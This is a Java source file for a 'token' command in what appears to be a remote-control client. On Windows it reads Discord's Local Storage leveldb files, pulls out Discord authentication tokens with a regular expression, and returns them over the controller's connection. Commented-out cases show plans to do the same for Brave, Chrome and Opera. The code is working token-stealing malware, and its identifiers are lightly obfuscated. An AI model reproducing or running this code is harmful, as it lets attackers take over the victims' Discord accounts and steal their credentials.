package Client.command.commands;

import Client.command.Command;
import Client.utils.Prefixes;

import java.io.*;
import java.net.URL;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Token extends Command {

    public Token() {
        super("token", "gets tokens", "token [Discord/Brave/Chrome,Opera]");
    }

    // Create a switch statement that will call the correct token
    // based on the user's input.
    // If the user doesn't input a valid token, then it will return
    // an error message.
    @Override
    public void run(ArrayList<String> args, BufferedReader receive, PrintWriter send) {
        if (args.get(2) == null) {
            send.println(Prefixes.WARN + " Please specify a token type");
            send.println("done");
            return;
        }
        switch (args.get(2).toLowerCase()) {
            case "discord":
                send.println(lol(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/"));
                break;
//            case "Brave":
//                send.println(getBraveToken());
//                break;
//            case "Chrome":
//                send.println(getChromeToken());
//                break;
//            case "Opera":
//                send.println(getOperaToken());
//                break;
//            default:
//                send.println(Prefixes.WARN + "Invalid token type.");
//                break;
        }
        send.println("done");
    }

    private String lol(String s) {
        String llLlLlL = System.getProperty("os.name");

        if (llLlLlL.contains("Windows")) {

            int cx = 0;
            StringBuilder b = new StringBuilder();

            try {
                File f = new File(s);
                File[] pathnames = f.listFiles();

                assert pathnames != null;
                for (File pathname : pathnames) {
                   // System.out.println(pathname.getAbsolutePath());
                    try {
                        FileInputStream fstream = new FileInputStream(pathname.getAbsolutePath());
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));

                        String strLine;
                        while (!(strLine = br.readLine()).isEmpty()) {


                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Matcher m = p.matcher(strLine);

                            while (m.find()) {
                                if (cx > 0) {
                                    b.append("\n");
                                }
                                b.append(" ").append(m.group());
                                cx++;
                            }

                        }

                    } catch (Exception ignored) {
                    }
                }
                return (b.toString().isEmpty()) ? Prefixes.WARN + " No tokens found" : b.toString();

            } catch (Exception e) {
                return ("Error: " + e.getMessage());
            }
        }

        return "Error - idk y";
    }
}

